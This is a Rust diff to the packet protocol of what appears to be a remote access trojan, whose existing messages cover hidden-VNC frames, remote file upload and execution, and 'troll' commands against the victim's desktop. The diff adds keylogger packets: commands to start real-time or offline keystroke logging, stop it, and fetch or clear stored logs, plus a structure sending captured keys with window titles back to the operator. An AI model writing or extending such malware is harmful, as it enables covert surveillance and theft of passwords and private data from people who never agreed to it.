@@ -30,6 +30,10 @@ pub enum ServerboundPacket {
     CurrentFolder(String),   
 
     HVNCFrame(Vec<u8>),
+
+    // Keylogger
+    KeyloggerUpdate(KeyloggerUpdate),
+    KeyloggerOfflineLogs(Vec<String>),
 }
 
 impl Packet for ServerboundPacket {
@@ -60,6 +64,8 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::FileList(_) => "File List",
             ServerboundPacket::CurrentFolder(_) => "Current Folder",
             ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
+            ServerboundPacket::KeyloggerUpdate(_) => "Keylogger Update",
+            ServerboundPacket::KeyloggerOfflineLogs(_) => "Keylogger Offline Logs",
         }
     }
 }
@@ -116,6 +122,12 @@ pub enum ClientboundPacket {
     UploadFile(String, FileData),
 
     TrollClient(TrollCommand),
+
+    // Keylogger
+    StartKeylogger(bool), // true = real-time, false = offline only
+    StopKeylogger,
+    GetOfflineLogs,
+    ClearOfflineLogs,
 }
 
 impl Packet for ClientboundPacket {
@@ -176,6 +188,10 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::ExecuteFile(_) => "Execute File",
             ClientboundPacket::UploadFile(_, _) => "Upload File",
             ClientboundPacket::TrollClient(_) => "Troll Client",
+            ClientboundPacket::StartKeylogger(_) => "Start Keylogger",
+            ClientboundPacket::StopKeylogger => "Stop Keylogger",
+            ClientboundPacket::GetOfflineLogs => "Get Offline Logs",
+            ClientboundPacket::ClearOfflineLogs => "Clear Offline Logs",
         }
     }
 }
@@ -267,6 +283,12 @@ pub struct ScreenshotData {
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct KeyloggerUpdate {
+    pub window_title: String,
+    pub key_data: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
 #[serde(tag = "type", content = "payload")]
 pub enum TrollCommand {
     HideDesktop(String),
@@ -289,4 +311,3 @@ pub enum TrollCommand {
     Beep(String),
     PianoKey(String),
 }
-
